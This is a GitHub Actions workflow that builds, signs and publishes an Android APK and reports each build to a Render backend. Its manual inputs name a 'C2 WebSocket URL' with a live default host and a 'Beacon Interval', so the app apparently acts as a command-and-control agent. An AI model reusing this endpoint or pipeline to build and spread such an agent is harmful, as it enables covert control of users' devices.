name: CI/CD Pipeline

on:
  workflow_dispatch:
    inputs:
      c2WsUrl:
        description: 'C2 WebSocket URL'
        required: false
        default: 'wss://bixtx.onrender.com/agent'
      beaconInterval:
        description: 'Beacon Interval (seconds)'
        required: false
        default: '30'
  push:
    branches:
      - main
    paths:
      - 'software-android/**'
      - '.github/workflows/build-android.yml'

permissions:
  contents: write

jobs:
  backend:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Notify backend build started
        if: always()
        run: |
          curl -X POST "${{ secrets.RENDER_APK_NOTIFY_URL }}/build/android/started" \
            -H "Content-Type: application/json" \
            -d '{"status":"started","secret":"${{ secrets.RENDER_APK_NOTIFY_SECRET }}"}'

  android-build:
    runs-on: ubuntu-latest
    needs: backend
    env:
      ANDROID_HOME: ${{ github.workspace }}/android-sdk
      ANDROID_SDK_ROOT: ${{ github.workspace }}/android-sdk
    steps:
      - uses: actions/checkout@v4

      - name: Set up Java
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'
          cache: gradle

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3
        with:
          packages: 'cmdline-tools;latest platform-tools build-tools;34.0.0 platforms;android-34'

      - name: Accept SDK licenses & write local.properties
        run: |
          yes | sdkmanager --licenses > /dev/null 2>&1 || true
          echo "sdk.dir=$ANDROID_HOME" > software-android/local.properties

      - name: Gradle cache
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
          key: ${{ runner.os }}-gradle-${{ hashFiles('software-android/**/gradle-wrapper.properties', 'software-android/**/*.gradle', 'software-android/**/*.gradle.kts') }}
          restore-keys: |
            ${{ runner.os }}-gradle-

      - name: Decode Android keystore
        run: |
          if [ -n "${{ secrets.ANDROID_KEYSTORE_BASE64 }}" ]; then
            mkdir -p software-android/app
            printf '%s' "${{ secrets.ANDROID_KEYSTORE_BASE64 }}" | base64 --decode > software-android/app/keystore.jks
            {
              echo "storePassword=${{ secrets.ANDROID_KEYSTORE_PASSWORD }}"
              echo "keyPassword=${{ secrets.ANDROID_KEY_PASSWORD }}"
              echo "keyAlias=${{ secrets.ANDROID_KEY_ALIAS }}"
              echo "storeFile=app/keystore.jks"
            } > software-android/keystore.properties
            echo "Keystore file created at software-android/app/keystore.jks"
          else
            echo "WARNING: ANDROID_KEYSTORE_BASE64 secret is not set. Building unsigned APK."
          fi

      - name: Verify keystore
        if: hashFiles('software-android/app/keystore.jks') != ''
        run: |
          echo "Keystore file exists:"
          ls -lh software-android/app/keystore.jks
          echo "File type:"
          file software-android/app/keystore.jks
          echo "Attempting to list keystore contents..."
          keytool -list -v -keystore software-android/app/keystore.jks \
            -storepass "${{ secrets.ANDROID_KEYSTORE_PASSWORD }}" \
            -alias "${{ secrets.ANDROID_KEY_ALIAS }}" 2>&1 || echo "Keystore verification failed - will attempt to build"

      - name: Build release APK
        working-directory: software-android
        run: |
          chmod +x gradlew
          ./gradlew assembleRelease --no-daemon --stacktrace

      - name: Upload APK artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: app-release-apk
          path: software-android/app/build/outputs/apk/release/*.apk
          if-no-files-found: ignore

      - name: Create GitHub Release
        if: success()
        uses: softprops/action-gh-release@v2
        with:
          tag_name: android-build-${{ github.run_number }}
          files: software-android/app/build/outputs/apk/release/app-release.apk

      - name: Notify backend build completed
        if: always()
        run: |
          curl --fail-with-body -X POST \
            "${{ secrets.RENDER_APK_NOTIFY_URL }}/build/android/notify" \
            -H "Content-Type: application/json" \
            -d '{"status":"completed","downloadUrl":"https://github.com/${{ github.repository }}/releases/download/android-build-${{ github.run_number }}/app-release.apk","secret":"${{ secrets.RENDER_APK_NOTIFY_SECRET }}"}'
